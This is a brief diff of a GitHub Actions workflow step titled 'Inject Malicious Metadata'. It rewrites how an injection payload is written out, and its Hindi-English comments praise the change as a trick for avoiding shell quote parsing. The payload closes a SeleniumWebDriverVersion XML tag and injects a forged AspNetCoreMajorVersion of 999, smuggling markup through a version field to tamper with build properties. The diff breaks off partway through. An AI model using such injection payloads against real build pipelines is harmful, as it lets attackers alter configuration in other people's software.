@@ -11,6 +11,8 @@ jobs:
 
       - name: "Inject Malicious Metadata"
         id: metadata
+        # Elite Trick: Hum payload ko ek ENV block ke andar define kar rahe hain
+        # jisse shell ko koi quote parsing karni hi nahi padegi.
         run: |
-          echo "payload<<EOF" >> $GITHUB_OUTPUT
-          echo "1.2.3</SeleniumWebDriverVersion><AspNetCoreMajorVersion>999</AspNetCoreMajorVersion>
+          cat << 'EOF' > payload.txt
+          1.2.3</SeleniumWebDriverVersion><AspNetCoreMajorVersion>999</AspNetCoreMajorVersion>
